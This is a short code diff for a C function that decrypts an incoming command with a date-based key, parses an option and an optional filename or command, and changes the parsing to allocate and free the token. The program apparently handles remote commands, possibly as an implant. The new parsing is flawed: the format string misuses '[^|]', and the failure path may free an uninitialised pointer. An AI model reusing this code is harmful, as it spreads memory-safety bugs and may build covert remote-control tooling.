@@ -187,8 +187,9 @@ void getCommand(char **command, int payloadSize)
     decryptedCommand = encrypt_data(*command, date, payloadSize);
     
     // Get the command value and an optional filename or command
-    if (sscanf(decryptedCommand, "%d[^|]%s", &option, token) == 0)
+    if (sscanf(decryptedCommand, "%d[^|]%as", &option, &token) == 0)
     {
+        free(token);
         return;
     }
     
@@ -205,4 +206,5 @@ void getCommand(char **command, int payloadSize)
         default:
             break;
     }
+    free(token);
 }
